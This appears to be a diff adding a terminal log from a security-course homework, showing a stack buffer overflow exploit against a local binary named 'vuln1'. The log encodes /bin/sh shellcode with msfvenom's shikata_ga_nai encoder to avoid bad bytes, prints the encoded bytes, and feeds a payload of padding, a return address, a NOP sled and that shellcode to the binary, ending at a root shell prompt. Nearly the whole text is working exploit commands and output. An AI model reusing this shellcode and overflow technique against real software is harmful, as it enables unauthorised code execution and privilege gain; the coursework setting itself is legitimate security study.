@@ -1,0 +1,22 @@
+┌──(root㉿kali)-[~]
+└─# echo '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80' | msfvenom -p stdin -a x86 --platform unix -b '\x00\x68\x69\x6a\x6b\x6c\x6d\x6e' -f raw | od -t x1 > /tmp/a
+Attempting to read payload from STDIN...
+Found 11 compatible encoders
+Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
+x86/shikata_ga_nai succeeded with size 51 (iteration=0)
+x86/shikata_ga_nai chosen with final size 51
+Payload size: 51 bytes
+
+                                                                                                                                                                                                                  
+┌──(root㉿kali)-[~]
+└─# cat /tmp/a
+0000000 b8 b9 7b 5c 9a da cc d9 74 24 f4 5e 29 c9 b1 07
+0000020 31 46 12 03 46 12 83 57 87 be 6f 96 b8 6f f8 f7
+0000040 17 e3 90 6f 47 61 08 01 1e 86 9a 8e a9 a8 ab 3b
+0000060 67 aa c6
+0000063
+
+
+kali@kali:/home/kali/courses/cse509/hw2$ ./vuln1 `python2 -c 'print "A"*268 + "\x8c\xf2\xff\xbf" + "\x90"*100 + "\xb8\xb9\x7b\x5c\x9a\xda\xcc\xd9\x74\x24\xf4\x5e\x29\xc9\xb1\x07\x31\x46\x12\x03\x46\x12\x83\x57\x87\xbe\x6f\x96\xb8\x6f\xf8\xf7\x17\xe3\x90\x6f\x47\x61\x08\x01\x1e\x86\x9a\x8e\xa9\xa8\xab\x3b\x67\xaa\xc6" '`
+Input: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����������������������������������������������������������������������������������������������������������{\����t$�^)ɱ1FF�W��o��o����oG������;g��
+# exit   
